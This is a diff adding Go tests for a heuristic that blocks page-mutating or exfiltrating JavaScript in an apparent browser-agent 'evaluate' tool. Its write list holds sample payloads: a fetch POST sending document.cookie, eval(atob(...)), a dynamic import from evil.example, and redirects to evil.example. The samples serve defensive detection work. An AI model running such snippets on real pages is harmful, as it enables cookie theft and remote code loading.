@@ -212,3 +212,93 @@ func TestGateBrowserCall_NilPolicyAllows(t *testing.T) {
 		t.Fatalf("nil policy should not gate, blocked=%v result=%v", blocked, result)
 	}
 }
+
+// TestLooksLikeEvalWrite covers the fail-closed heuristic: obvious page
+// mutations / exfiltration must match, plain reads and local variable
+// assignments must not.
+func TestLooksLikeEvalWrite(t *testing.T) {
+	writes := []string{
+		`fetch('/api', {method:'POST', body:document.cookie})`,
+		`new XMLHttpRequest()`,
+		`navigator.sendBeacon('/log', data)`,
+		`window.parent.postMessage(secret, '*')`,
+		`window.open('https://evil.example')`,
+		`eval(atob('...'))`,
+		`new Function('return 1')()`,
+		`import('https://evil.example/x.js')`,
+		`document.write('<img src=x>')`,
+		`location = 'https://evil.example'`,
+		`location.href = 'https://evil.example'`,
+		`location.replace('https://evil.example')`,
+		`document.cookie = 'session=...'`,
+		`localStorage.setItem('k', 'v')`,
+		`sessionStorage.clear()`,
+		`indexedDB.deleteDatabase('db')`,
+		`el.innerHTML = '<script>...</script>'`,
+		`input.value = 'typed'`,
+		`el.textContent = 'replaced'`,
+		`document.body.appendChild(node)`,
+		`form.submit()`,
+		`btn.click()`,
+		`el.setAttribute('data-x', 'y')`,
+		`window.__leak = 1`,
+		`document.title = 'changed'`,
+	}
+	for _, expr := range writes {
+		if !LooksLikeEvalWrite(expr) {
+			t.Errorf("LooksLikeEvalWrite(%q) = false, want true (write/exfiltration)", expr)
+		}
+	}
+
+	reads := []string{
+		`document.title`,
+		`document.querySelector('h1').textContent`,
+		`el.textContent.trim()`,
+		`location.href`,
+		`location.href === 'https://x.example/'`,
+		`location.hostname`,
+		`const a = el.value; a.length`,
+		`JSON.stringify(window.__INITIAL_STATE__)`,
+		`Array.from(document.querySelectorAll('a')).map(a => a.href)`,
+		`localStorage.getItem('k')`,
+		`getComputedStyle(el).display`,
+		`document.cookie`,
+		`el.getAttribute('data-x')`,
+	}
+	for _, expr := range reads {
+		if LooksLikeEvalWrite(expr) {
+			t.Errorf("LooksLikeEvalWrite(%q) = true, want false (read-only)", expr)
+		}
+	}
+}
+
+// TestGateBrowserCall_EvalWriteGuard verifies allow_eval_write=false blocks
+// mutating evaluate expressions while read-only ones still flow through the
+// normal verdict path, and allow_eval_write=true disables the guard.
+func TestGateBrowserCall_EvalWriteGuard(t *testing.T) {
+	mkPolicy := func(allowWrite bool) PolicyProvider {
+		return func() PolicyConfig {
+			return PolicyConfig{
+				RequireConfirm: "never", // isolate the eval guard from confirm flow
+				AllowEvalWrite: allowWrite,
+			}
+		}
+	}
+	writeExpr := map[string]any{"expression": `fetch('/api', {method:'POST'})`}
+
+	blocked, result := gateBrowserCall(nil, mkPolicy(false), "browser_evaluate", writeExpr, "https://x.example", nil)
+	if !blocked || result == nil || !result.IsError {
+		t.Fatalf("write expression should be blocked when allow_eval_write=false, blocked=%v result=%+v", blocked, result)
+	}
+
+	blocked, result = gateBrowserCall(nil, mkPolicy(true), "browser_evaluate", writeExpr, "https://x.example", nil)
+	if blocked || result != nil {
+		t.Fatalf("write expression should pass when allow_eval_write=true, blocked=%v result=%+v", blocked, result)
+	}
+
+	readExpr := map[string]any{"expression": `document.querySelector('h1').textContent`}
+	blocked, result = gateBrowserCall(nil, mkPolicy(false), "browser_evaluate", readExpr, "https://x.example", nil)
+	if blocked || result != nil {
+		t.Fatalf("read-only expression should pass when allow_eval_write=false, blocked=%v result=%+v", blocked, result)
+	}
+}
